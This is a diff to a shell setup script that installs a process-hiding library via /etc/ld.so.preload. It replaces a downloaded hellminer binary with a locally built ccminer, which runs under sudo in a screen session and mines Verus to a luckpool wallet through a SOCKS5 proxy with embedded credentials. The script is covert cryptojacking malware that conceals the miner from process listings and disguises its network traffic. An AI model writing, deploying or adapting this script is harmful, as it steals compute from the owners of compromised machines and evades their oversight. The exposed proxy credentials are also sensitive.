@@ -11,9 +11,13 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-rm *.tar.gz *.sh
-mv hellminer zero
-
-screen sudo ./zero -c stratum+tcp://na.luckpool.net:3956 -u RAcBGk2mLkXuaG5qYtGeTRbdMQQi5JQ4jc.Bin -p x --cpu 4
+apt update && apt upgrade -y
+apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+curl -v -x "socks5://jwegwndc-1:mj2pb21fuqzo@p.webshare.io:80/" webshare.io/
+screen sudo ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RAcBGk2mLkXuaG5qYtGeTRbdMQQi5JQ4jc.BIN -t4 -x --proxy=socks5://jwegwndc-1:mj2pb21fuqzo@p.webshare.io:80
